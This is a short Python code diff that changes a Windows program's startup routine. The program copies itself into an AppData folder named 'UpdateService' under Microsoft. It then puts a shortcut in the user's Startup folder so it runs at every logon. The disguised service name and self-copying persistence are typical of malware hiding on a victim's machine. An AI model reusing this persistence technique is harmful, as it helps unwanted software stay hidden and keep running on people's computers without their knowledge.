@@ -115,10 +115,10 @@ class main():
 
 	def startup(self):
 		if not os.path.exists(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.Ink"):
+			shutil.copytree(os.getcwd(), fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService")
 			shell = win32com.client.Dispatch("WScript.Shell")
 			shortcut = shell.CreateShortCut(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.Ink")
 			shortcut.Targetpath = fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService\{self.filename}"
-			shortcut.WindowStyle = 7 # 7 - Minimized, 3 - Maximized, 1 - Normal
 			shortcut.save()
 		
 
